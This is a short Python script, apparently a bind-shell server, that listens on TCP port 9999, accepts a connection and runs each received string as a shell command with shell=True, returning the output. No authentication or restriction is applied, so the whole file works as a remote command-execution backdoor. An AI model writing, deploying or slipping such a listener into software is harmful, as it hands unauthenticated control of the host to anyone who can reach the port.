import socket
import subprocess

s_PORT   = 9999
#only ipv4
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((b'',s_PORT))
server.listen(5)

print("Server is waiting")
client,addr=server.accept()
print("client connected ",addr)


while True:
    command=client.recv(1024)
    if not command:
        #client.send("bye".encode())
        break
    print("given command "+command.decode())
    try:
        #subprocess.getstatusoutput(cmd)
        output=subprocess.check_output(command.decode(),shell=True)
        if output.decode() == "":
            client.send("no output".encode())
        else:
            client.send(output)
    except Exception:
        print("Error in executing command")
        client.send("No such command".encode())



server.close()